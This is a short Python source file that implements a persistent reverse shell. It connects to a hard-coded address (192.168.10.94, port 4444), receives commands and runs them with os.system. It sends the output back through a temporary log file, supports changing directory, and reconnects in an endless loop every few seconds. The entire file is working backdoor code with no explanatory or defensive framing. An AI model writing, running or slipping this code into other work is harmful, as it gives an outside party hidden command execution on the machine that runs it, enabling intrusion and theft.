# -*- coding: cp866 -*-


import socket, os, time

def main():
	try:
		ip = "192.168.10.94"
		port = 4444
		temp_file = "log.txt"

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))

		full_msg = os.getcwd() + "{<END MSG>}"
		s.send(full_msg.encode('cp866'))

		while True:
			full_msg = ''
			while True:
				msg  = s.recv(1024)
				full_msg += msg.decode('cp866');
				if full_msg[-11:] == "{<END MSG>}":
					break
			if full_msg[:-11].split()[0] == 'cd':
				os.chdir(full_msg[full_msg.find(' ') + 1:-11])
				full_msg = os.getcwd() + "{<END MSG>}"
			elif full_msg[:-11] == "exit":
				s.close()
				time.sleep(5)
				return 1
			else:
				os.system(full_msg[:-11] + " > " + temp_file)
				fin = open(temp_file, 'r', encoding='cp866')
				full_msg = fin.read() + os.getcwd() + "{<END MSG>}"
				fin.close()
			s.send(full_msg.encode('cp866'))
	except:
		s.close()
		time.sleep(5)
		return 1

if __name__ == '__main__':
	while True:
		main()
